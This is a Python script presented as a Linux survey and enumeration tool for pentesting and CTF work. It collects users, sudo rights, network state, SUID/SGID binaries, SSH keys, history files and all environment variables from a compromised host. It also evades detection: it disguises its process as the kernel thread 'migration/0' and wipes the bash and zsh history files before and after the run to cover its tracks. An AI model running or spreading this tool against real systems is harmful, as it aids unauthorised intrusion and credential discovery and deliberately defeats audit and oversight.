#!/usr/bin/env python3
"""
Linux Survey/Enumeration Script
For pentesting and CTF enumeration
"""

import os
import subprocess
import socket
import pwd
import grp
import platform
from pathlib import Path

# Rename the process for stealth
try:
    import setproctitle
    setproctitle.setproctitle('migration/0')  # Disguise as kernel migration thread
except ImportError:
    # If setproctitle not available, try ctypes method
    try:
        import ctypes
        libc = ctypes.CDLL('libc.so.6')
        # Set process name (limited to 16 chars on Linux)
        buff = ctypes.create_string_buffer(b'migration/0')
        libc.prctl(15, ctypes.byref(buff), 0, 0, 0)  # PR_SET_NAME = 15
    except:
        pass  # If renaming fails, continue anyway

def run_cmd(cmd):
    """Execute a shell command and return output"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
        output = result.stdout.strip()
        
        # If command failed, check for permission errors
        if result.returncode != 0:
            stderr = result.stderr.strip()
            if stderr:
                if "Permission denied" in stderr:
                    return "[Permission Denied - requires elevated privileges]"
                elif stderr:
                    return f"[Error: {stderr[:100]}]"
        
        return output if output else "[No output or command not found]"
    except subprocess.TimeoutExpired:
        return "[Command timed out]"
    except Exception as e:
        return f"[Error: {e}]"

def print_section(title):
    """Print a formatted section header"""
    print(f"\n{'='*60}")
    print(f"  {title}")
    print('='*60)

def system_info():
    """Gather basic system information"""
    print_section("SYSTEM INFORMATION")
    print(f"Hostname: {socket.gethostname()}")
    print(f"OS: {platform.system()} {platform.release()}")
    print(f"Kernel: {platform.version()}")
    print(f"Architecture: {platform.machine()}")
    print(f"Python Version: {platform.python_version()}")
    
    # Uptime
    uptime = run_cmd("uptime -p")
    print(f"Uptime: {uptime}")
    
    # Distribution info
    print("\nDistribution Info:")
    print(run_cmd("cat /etc/os-release 2>/dev/null || cat /etc/issue"))

def user_info():
    """Gather user and group information"""
    print_section("USER INFORMATION")
    
    # Current user
    print(f"Current User: {os.getenv('USER')}")
    print(f"UID: {os.getuid()}")
    print(f"GID: {os.getgid()}")
    print(f"Groups: {run_cmd('groups')}")
    
    # Check if root
    if os.getuid() == 0:
        print("\n[!] Running as ROOT!")
    else:
        print("\n[*] Running as unprivileged user (some commands may fail)")
    
    # Home directory
    print(f"Home Directory: {os.path.expanduser('~')}")
    print(f"Current Directory: {os.getcwd()}")
    
    # Sudo permissions (will fail gracefully if no sudo access)
    print("\nSudo Permissions:")
    sudo_check = run_cmd("sudo -l 2>/dev/null")
    if sudo_check:
        print(sudo_check)
    else:
        print("[No sudo access or sudo not available]")
    
    # All users
    print("\nSystem Users (UID >= 1000):")
    try:
        for user in pwd.getpwall():
            if user.pw_uid >= 1000 or user.pw_uid == 0:
                print(f"  {user.pw_name} (UID: {user.pw_uid}) - {user.pw_dir} - {user.pw_shell}")
    except Exception as e:
        print(f"[Error reading user database: {e}]")
    
    # Recently logged in users
    print("\nRecent Logins:")
    print(run_cmd("last -n 10 2>/dev/null"))

def network_info():
    """Gather network configuration"""
    print_section("NETWORK INFORMATION")
    
    # IP addresses
    print("IP Configuration:")
    print(run_cmd("ip addr show 2>/dev/null || ifconfig"))
    
    # Routing table
    print("\nRouting Table:")
    print(run_cmd("ip route 2>/dev/null || route -n"))
    
    # DNS
    print("\nDNS Configuration:")
    print(run_cmd("cat /etc/resolv.conf"))
    
    # Active connections
    print("\nActive Network Connections:")
    print(run_cmd("ss -tunap 2>/dev/null || netstat -tunap 2>/dev/null"))
    
    # Listening ports
    print("\nListening Ports:")
    print(run_cmd("ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null"))
    
    # ARP table
    print("\nARP Table:")
    print(run_cmd("ip neigh 2>/dev/null || arp -a"))

def process_info():
    """Gather running process information"""
    print_section("RUNNING PROCESSES")
    
    print("Process List (top 20 by CPU):")
    print(run_cmd("ps aux --sort=-%cpu | head -20"))
    
    print("\nProcesses Running as Root:")
    print(run_cmd("ps aux | grep '^root' | head -15"))

def installed_software():
    """List installed software and interesting binaries"""
    print_section("INSTALLED SOFTWARE")
    
    # Package managers
    if os.path.exists("/usr/bin/dpkg"):
        print("Debian/Ubuntu Packages (sample):")
        print(run_cmd("dpkg -l | head -20"))
    elif os.path.exists("/usr/bin/rpm"):
        print("RPM-based Packages (sample):")
        print(run_cmd("rpm -qa | head -20"))
    
    # Development tools
    print("\nDevelopment Tools:")
    for tool in ['gcc', 'g++', 'python', 'python3', 'perl', 'ruby', 'java', 'git']:
        version = run_cmd(f"which {tool} 2>/dev/null && {tool} --version 2>/dev/null | head -1")
        if version:
            print(f"  {tool}: {version}")
    
    # Useful binaries
    print("\nInteresting Binaries:")
    for binary in ['nc', 'netcat', 'wget', 'curl', 'socat', 'nmap', 'tcpdump']:
        path = run_cmd(f"which {binary} 2>/dev/null")
        if path:
            print(f"  {binary}: {path}")

def file_permissions():
    """Check for interesting file permissions and SUID/SGID"""
    print_section("FILE PERMISSIONS & SUID/SGID")
    
    # SUID files
    print("SUID Binaries (common locations):")
    print(run_cmd("find /usr/bin /usr/sbin /bin /sbin -perm -4000 2>/dev/null | head -20"))
    
    # SGID files
    print("\nSGID Binaries (common locations):")
    print(run_cmd("find /usr/bin /usr/sbin /bin /sbin -perm -2000 2>/dev/null | head -20"))
    
    # World-writable directories
    print("\nWorld-Writable Directories:")
    print(run_cmd("find / -type d -perm -0002 2>/dev/null | grep -v '/proc' | head -15"))
    
    # World-writable files
    print("\nWorld-Writable Files (excluding /proc):")
    print(run_cmd("find / -type f -perm -0002 2>/dev/null | grep -v '/proc' | head -15"))

def interesting_files():
    """Search for potentially interesting files"""
    print_section("INTERESTING FILES")
    
    # SSH keys
    print("SSH Keys:")
    print(run_cmd("find / -name id_rsa -o -name id_dsa -o -name authorized_keys 2>/dev/null"))
    
    # History files
    print("\nHistory Files:")
    print(run_cmd("find /home /root -name '.*history' 2>/dev/null"))
    
    # Config files with potential credentials
    print("\nConfiguration Files (sample):")
    for pattern in ['*.conf', '*.config', '*.cfg']:
        files = run_cmd(f"find /etc -name '{pattern}' 2>/dev/null | head -10")
        if files:
            print(files)
    
    # Database files
    print("\nDatabase Files:")
    print(run_cmd("find / -name '*.db' -o -name '*.sqlite' -o -name '*.sql' 2>/dev/null | head -10"))
    
    # Backup files
    print("\nBackup Files:")
    print(run_cmd("find / -name '*.bak' -o -name '*.backup' -o -name '*~' 2>/dev/null | head -10"))

def services_cron():
    """Check running services and scheduled tasks"""
    print_section("SERVICES & SCHEDULED TASKS")
    
    # Systemd services
    print("Active Services (systemd):")
    print(run_cmd("systemctl list-units --type=service --state=running 2>/dev/null | head -20"))
    
    # Cron jobs
    print("\nCron Jobs:")
    print(run_cmd("cat /etc/crontab 2>/dev/null"))
    print(run_cmd("ls -la /etc/cron* 2>/dev/null"))
    
    # User cron jobs
    print("\nUser Cron Jobs:")
    print(run_cmd("crontab -l 2>/dev/null"))

def environment_vars():
    """Display environment variables"""
    print_section("ENVIRONMENT VARIABLES")
    for key, value in os.environ.items():
        print(f"{key}={value}")

def security_tools():
    """Check for security tools and defenses"""
    print_section("SECURITY TOOLS")
    
    # Firewall
    print("Firewall Status:")
    print(run_cmd("iptables -L -n 2>/dev/null || ufw status 2>/dev/null"))
    
    # SELinux
    print("\nSELinux Status:")
    print(run_cmd("getenforce 2>/dev/null"))
    
    # AppArmor
    print("\nAppArmor Status:")
    print(run_cmd("aa-status 2>/dev/null"))

def cleanup_history():
    """Clear command history to cover tracks"""
    try:
        # Disable history tracking
        subprocess.run("unset HISTFILE && set +o history", shell=True)
        
        # Clear bash history
        subprocess.run("history -c 2>/dev/null", shell=True)
        subprocess.run("> ~/.bash_history 2>/dev/null", shell=True)
        
        # Clear zsh history
        subprocess.run("> ~/.zsh_history 2>/dev/null", shell=True)
    except:
        pass

def main():
    """Main execution function"""
    
    # Clean history BEFORE running (disable tracking)
    print("[*] Disabling history tracking...")
    cleanup_history()
    
    print("""
    ╔═══════════════════════════════════════════════════════╗
    ║         LINUX SURVEY/ENUMERATION SCRIPT              ║
    ║              For Training Purposes Only               ║
    ╚═══════════════════════════════════════════════════════╝
    """)
    
    # Run all enumeration modules
    system_info()
    user_info()
    network_info()
    process_info()
    installed_software()
    file_permissions()
    interesting_files()
    services_cron()
    environment_vars()
    security_tools()
    
    print_section("ENUMERATION COMPLETE")
    print("Survey finished. Review output for privilege escalation vectors.\n")
    
    # Clean history AFTER running (clear files)
    print("[*] Cleaning up history...")
    cleanup_history()

if __name__ == "__main__":
    main()